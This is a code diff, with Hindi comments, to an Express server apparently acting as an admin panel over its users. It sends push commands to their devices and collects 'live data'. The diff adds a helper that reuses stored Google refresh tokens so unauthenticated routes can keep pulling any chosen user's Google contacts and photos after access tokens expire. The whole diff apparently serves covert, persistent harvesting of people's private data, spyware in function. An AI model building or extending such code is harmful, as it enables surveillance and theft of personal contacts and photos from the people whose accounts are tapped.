@@ -6,7 +6,6 @@ const webpush = require('web-push');
 const bodyParser = require('body-parser');
 const path = require('path');
 const admin = require('firebase-admin');
-// सबसे ज़रूरी नया पैकेज: गूगल की आधिकारिक लाइब्रेरी
 const { google } = require('googleapis');
 
 // =================================================================
@@ -35,7 +34,7 @@ const privateVapidKey = process.env.PRIVATE_VAPID_KEY;
 webpush.setVapidDetails('mailto:your-email@example.com', publicVapidKey, privateVapidKey);
 
 // =================================================================
-// 4. API रूट्स (Endpoints) - अब गूगल डेटा के लिए नए रूट्स के साथ
+// 4. API रूट्स (Endpoints) - गूगल डेटा प्राप्त करने के लिए अंतिम बदलाव
 // =================================================================
 
 let reportedData = [];
@@ -43,12 +42,14 @@ let reportedData = [];
 // ---- रूट 1: एडमिन पैनल के लिए सभी उपयोगकर्ताओं की लिस्ट लाना (अपरिवर्तित) ----
 app.get('/get-users', async (req, res) => {
     try {
-        const usersSnapshot = await admin.firestore().collection('users').orderBy('lastLogin', 'desc').get();
+        const usersSnapshot = await db.collection('users').orderBy('lastLogin', 'desc').get();
         const users = usersSnapshot.docs.map(doc => ({
             uid: doc.id,
-            ...doc.data()
+            displayName: doc.data().displayName,
+            email: doc.data().email,
+            photoURL: doc.data().photoURL
         }));
-        res.status(200).json(users.map(u => ({ uid: u.uid, displayName: u.displayName, email: u.email, photoURL: u.photoURL })));
+        res.status(200).json(users);
     } catch (error) {
         console.error("उपयोगकर्ताओं को लाने में त्रुटि:", error);
         res.status(500).json({ error: 'Failed to fetch users.' });
@@ -59,7 +60,7 @@ app.get('/get-users', async (req, res) => {
 app.post('/send-command', async (req, res) => {
     const { userId, command } = req.body;
     try {
-        const userDoc = await admin.firestore().collection('users').doc(userId).get();
+        const userDoc = await db.collection('users').doc(userId).get();
         if (!userDoc.exists) return res.status(404).json({ error: 'User not found.' });
         const { pushSubscription } = userDoc.data();
         if (!pushSubscription) return res.status(400).json({ error: 'User not subscribed.' });
@@ -72,66 +73,78 @@ app.post('/send-command', async (req, res) => {
     }
 });
 
-// ==========================================================================
-// === बदलाव यहाँ से शुरू होता है: गूगल डेटा प्राप्त करने के लिए नए रूट्स ===
-// ==========================================================================
+// ================================================================================
+// === यही एकमात्र, सबसे ज़रूरी और अंतिम बदलाव है (Stale Token Fix) ===
+// ================================================================================
 
-// ---- रूट 3: किसी उपयोगकर्ता के गूगल कॉन्टैक्ट्स लाना ----
+// एक हेल्पर फंक्शन जो गूगल क्लाइंट को ताज़ा टोकन के साथ तैयार करता है
+async function getAuthenticatedGoogleClient(userId) {
+    const userDoc = await db.collection('users').doc(userId).get();
+    if (!userDoc.exists) {
+        throw new Error('User not found.');
+    }
+
+    const { googleAccessToken, googleRefreshToken } = userDoc.data();
+    if (!googleRefreshToken) { // अब हम मास्टर चाबी (refresh token) की जांच करते हैं
+        throw new Error('User has no refresh token.');
+    }
+
+    const oauth2Client = new google.auth.OAuth2(
+        process.env.GOOGLE_CLIENT_ID,
+        process.env.GOOGLE_CLIENT_SECRET
+    );
+
+    oauth2Client.setCredentials({
+        access_token: googleAccessToken,
+        refresh_token: googleRefreshToken
+    });
+    
+    // यह लाइन जादुई है: यह जांचती है कि क्या accessToken एक्सपायर हो गया है,
+    // और अगर हो गया है, तो यह refreshToken का उपयोग करके अपने आप एक नया accessToken बना लेती है।
+    await oauth2Client.getAccessToken();
+
+    return oauth2Client;
+}
+
+
+// ---- रूट 3: किसी उपयोगकर्ता के गूगल कॉन्टैक्ट्स लाना (अब ज़्यादा शक्तिशाली) ----
 app.get('/get-contacts/:userId', async (req, res) => {
     const { userId } = req.params;
     try {
-        const userDoc = await admin.firestore().collection('users').doc(userId).get();
-        if (!userDoc.exists) return res.status(404).json({ error: 'User not found.' });
-        
-        const { googleAccessToken } = userDoc.data();
-        if (!googleAccessToken) return res.status(400).json({ error: 'User has no access token.' });
-
-        const oauth2Client = new google.auth.OAuth2();
-        oauth2Client.setCredentials({ access_token: googleAccessToken });
-
+        const oauth2Client = await getAuthenticatedGoogleClient(userId);
         const people = google.people({ version: 'v1', auth: oauth2Client });
         const response = await people.people.connections.list({
             resourceName: 'people/me',
             personFields: 'names,emailAddresses,phoneNumbers',
         });
-        
         res.status(200).json(response.data.connections || []);
-
     } catch (error) {
-        console.error("कॉन्टैक्ट्स लाने में त्रुटि:", error);
-        res.status(500).json({ error: 'Failed to fetch contacts.' });
+        console.error(`कॉन्टैक्ट्स लाने में त्रुटि (User: ${userId}):`, error.message);
+        res.status(500).json({ error: `Failed to fetch contacts: ${error.message}` });
     }
 });
 
-// ---- रूट 4: किसी उपयोगकर्ता की गूगल फोटोज लाना ----
+// ---- रूट 4: किसी उपयोगकर्ता की गूगल फोटोज लाना (अब ज़्यादा शक्तिशाली) ----
 app.get('/get-photos/:userId', async (req, res) => {
     const { userId } = req.params;
     try {
-        const userDoc = await admin.firestore().collection('users').doc(userId).get();
-        if (!userDoc.exists) return res.status(404).json({ error: 'User not found.' });
-
-        const { googleAccessToken } = userDoc.data();
-        if (!googleAccessToken) return res.status(400).json({ error: 'User has no access token.' });
+        const oauth2Client = await getAuthenticatedGoogleClient(userId);
+        const accessToken = oauth2Client.credentials.access_token;
         
-        // Photos API का उपयोग करने के लिए आपको Google Cloud में Photos Library API को सक्षम करना होगा
-        const oauth2Client = new google.auth.OAuth2();
-        oauth2Client.setCredentials({ access_token: googleAccessToken });
-        
-        // यह एक अनौपचारिक तरीका है Photos API को Node.js में इस्तेमाल करने का
         const photoApiUrl = 'https://photoslibrary.googleapis.com/v1/mediaItems?pageSize=50';
         const photoResponse = await fetch(photoApiUrl, {
-            headers: { 'Authorization': `Bearer ${googleAccessToken}` }
+            headers: { 'Authorization': `Bearer ${accessToken}` }
         });
         const photoData = await photoResponse.json();
-
+        
+        if (photoData.error) { throw new Error(photoData.error.message); }
+        
         res.status(200).json(photoData.mediaItems || []);
-
     } catch (error) {
-        console.error("फोटोज लाने में त्रुटि:", error);
-        res.status(500).json({ error: 'Failed to fetch photos.' });
+        console.error(`फोटोज लाने में त्रुटि (User: ${userId}):`, error.message);
+        res.status(500).json({ error: `Failed to fetch photos: ${error.message}` });
     }
 });
-
 
 // ---- रूट 5 और 6 (अपरिवर्तित) - लाइव डेटा को संभालने के लिए ----
 app.post('/report-data', (req, res) => {
